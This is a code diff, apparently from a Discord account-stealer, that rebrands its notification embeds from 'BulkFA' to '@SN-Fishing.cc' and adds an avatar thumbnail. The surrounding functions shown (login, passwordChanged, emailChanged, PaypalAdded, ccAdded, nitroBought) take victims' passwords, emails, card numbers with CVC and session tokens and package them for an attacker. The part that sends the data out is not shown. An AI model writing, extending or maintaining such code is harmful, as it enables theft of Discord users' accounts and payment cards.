@@ -648,9 +648,12 @@ const login = async (email, password, token) => {
         author: {
           name: json.username +"#" + json.discriminator + " - " +"("+json.id+")",
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-         },
+        },
         footer: {
           text: "@SN-Fishing.cc 🐟",
+        },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
@@ -692,7 +695,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: '@SN-Fishing.cc 🐟',
         },
       },
     ],
@@ -734,7 +737,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: '@SN-Fishing.cc 🐟',
         },
       },
     ],
@@ -776,7 +779,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: '@SN-Fishing.cc 🐟',
         },
       },
     ],
@@ -818,7 +821,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: '@SN-Fishing.cc 🐟',
         },
       },
     ],
@@ -862,7 +865,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: '@SN-Fishing.cc 🐟',
         },
       },
     ],
